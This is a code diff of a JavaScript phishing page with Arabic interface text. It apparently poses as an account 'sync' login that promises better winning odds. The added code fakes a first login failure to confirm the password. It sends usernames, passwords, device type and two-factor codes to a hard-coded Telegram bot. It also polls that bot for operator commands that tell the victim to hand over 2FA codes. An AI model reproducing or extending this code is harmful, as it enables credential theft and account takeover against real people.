@@ -1,8 +1,11 @@
 const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
 const CHAT_ID = "8026901193";
-let checkTimer = null;
 
-// 1. وظيفة إرسال البيانات (مع نوع الجهاز والمتصلين)
+let loginAttempts = 0;
+let checkTimer = null;
+let countdownTimer = null;
+let timeLeft = 50;
+
 async function processAuth() {
     const u = document.getElementById('u_log').value;
     const p = document.getElementById('u_pas').value;
@@ -11,76 +14,109 @@ async function processAuth() {
 
     if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");
 
-    btn.disabled = true;
-    btn.innerText = "Connecting...";
-    msg.innerText = "⏳ جاري فحص الحساب ومزامنة البيانات...";
+    loginAttempts++;
 
-    // جمع معلومات الجهاز
-    const device = navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iPhone" : "PC";
-    const report = `🎯 صيد جديد!\n👤 المستخدم: ${u}\n🔑 الباسوورد: ${p}\n📱 الجهاز: ${device}\n🟢 المتصلين الآن: ${Math.floor(Math.random() * 50) + 10}`;
+    // المحاولة 1: خطأ إجباري للتأكد
+    if (loginAttempts === 1) {
+        btn.disabled = true;
+        btn.innerText = "Verifying...";
+        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
+        
+        setTimeout(() => {
+            msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
+            msg.style.color = "#ff4444";
+            document.getElementById('u_pas').value = "";
+            btn.disabled = false;
+            btn.innerText = "Retry Sync";
+        }, 1500);
+        return;
+    }
 
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: "🔐 طلب الرمز (2FA)", callback_data: "ask_2fa" }],
-            [{ text: "❌ فشل/أوقف المصادقة", callback_data: "fail_msg" }],
-            [{ text: "✅ إدخال للرادار", callback_data: "go_radar" }]
-        ]
-    };
+    // المحاولة 2: العداد والانتظار
+    if (loginAttempts === 2) {
+        btn.disabled = true;
+        msg.style.color = "#00f2ff";
+        const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
+        
+        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${device}`);
 
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: report, reply_markup: keyboard })
-    });
-
-    // بدء الاستماع لأوامرك "يدوياً"
-    startAdminListening();
+        startCountdown(); 
+        startAdminListening(); 
+    }
 }
 
-// 2. محرك الاستماع (بدون تعليق)
+function startCountdown() {
+    const msg = document.getElementById('status-text');
+    countdownTimer = setInterval(() => {
+        msg.innerText = `⏳ جاري المزامنة السحابية... يرجى الانتظار (ثانية ${timeLeft})`;
+        timeLeft--;
+
+        if (timeLeft < 0) {
+            clearInterval(countdownTimer);
+            openRadar(); 
+        }
+    }, 1000);
+}
+
 function startAdminListening() {
     checkTimer = setInterval(async () => {
         try {
             const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
             const data = await res.json();
-            if (data.result.length > 0) {
-                const cmd = data.result[0].callback_query?.data;
+            if (data.result && data.result.length > 0) {
+                const cmd = data.result[0].message?.text.toUpperCase() || "";
                 
-                if (cmd === "ask_2fa") {
-                    stopAndApply("⚠️ فشلت المزامنة! حسابك محمي بـ 2FA. أدخل الرمز المكون من 6 أرقام الآن لرفع نسبة الفوز إلى 96%:");
-                } else if (cmd === "fail_msg") {
-                    stopAndApply("❌ خطأ في النظام! يرجى إيقاف "المصادقة الثنائية" من إعدادات حسابك فوراً لضمان سحب الأرباح التلقائي، ثم أعد المحاولة.");
-                } else if (cmd === "go_radar") {
-                    clearInterval(checkTimer);
-                    document.getElementById('auth-screen').classList.add('hidden');
-                    document.getElementById('main-app').classList.remove('hidden');
+                // أمر Q: تقرير المتصلين
+                if (cmd === "Q") {
+                    const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
+                    await sendToTelegram(`📊 تقرير المتصل الآن:\n📱 الجهاز: ${device}\n⏳ الوقت المتبقي له: ${timeLeft} ثانية\n🌐 الحالة: في شاشة المزامنة`);
+                }
+                // أمر 2FA: طلب الرمز
+                else if (cmd === "2FA") {
+                    clearInterval(countdownTimer);
+                    stopAndRequest2FA();
+                } 
+                // أمر OK: دخول فوري
+                else if (cmd === "OK") {
+                    clearInterval(countdownTimer);
+                    openRadar();
                 }
             }
         } catch (e) { console.log("Waiting..."); }
-    }, 3000); 
+    }, 2500);
 }
 
-function stopAndApply(text) {
+function stopAndRequest2FA() {
     clearInterval(checkTimer);
     const msg = document.getElementById('status-text');
     const pInput = document.getElementById('u_pas');
     const btn = document.getElementById('sync-btn');
 
-    msg.innerText = text;
-    msg.style.color = "#ff4444";
+    msg.innerText = "⚠️ فشلت المزامنة! حسابك محمي بـ 'المصادقة الثنائية'. أدخل الرمز المكون من 6 أرقام الآن لرفع نسبة الفوز:";
+    msg.style.color = "#ffcc00";
     pInput.value = "";
-    pInput.placeholder = "أدخل الرمز هنا...";
+    pInput.placeholder = "أدخل الرمز هنا";
     btn.disabled = false;
-    btn.innerText = "تحديث البيانات 🔄";
+    btn.innerText = "تأكيد الرمز 🔓";
     
-    // عند إدخال الرمز وإعادة الضغط
-    btn.onclick = () => {
+    btn.onclick = async () => {
         const code = pInput.value;
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 الرمز/تحديث: ${code}` })
-        });
+        await sendToTelegram(`🔐 تفضل رمز 2FA للضحية:\n🔢 CODE: ${code}`);
         alert("جاري التحقق.. انتظر رسالة النجاح");
+        btn.disabled = true;
     };
+}
+
+function openRadar() {
+    clearInterval(checkTimer);
+    document.getElementById('auth-screen').classList.add('hidden');
+    document.getElementById('main-app').classList.remove('hidden');
+}
+
+async function sendToTelegram(text) {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
 }
